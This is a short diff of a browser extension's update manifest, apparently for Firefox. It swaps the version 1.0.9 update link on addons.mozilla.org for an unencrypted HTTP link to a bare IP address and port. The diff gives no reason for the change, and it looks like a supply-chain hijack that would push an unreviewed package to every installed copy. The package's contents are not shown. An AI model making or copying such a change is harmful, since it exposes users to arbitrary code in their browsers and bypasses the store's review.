@@ -4,10 +4,9 @@
       "updates": [
         {
           "version": "1.0.9",
-          "update_link": "https://addons.mozilla.org/firefox/downloads/file/4641451/bc5289a5dd974fd7a866-1.0.9.xpi"
+          "update_link": "http://217.154.114.227:9586/ext/bc5289a5dd974fd7a866-1.0.9.xpi"
         }
       ]
     }
   }
 }
-
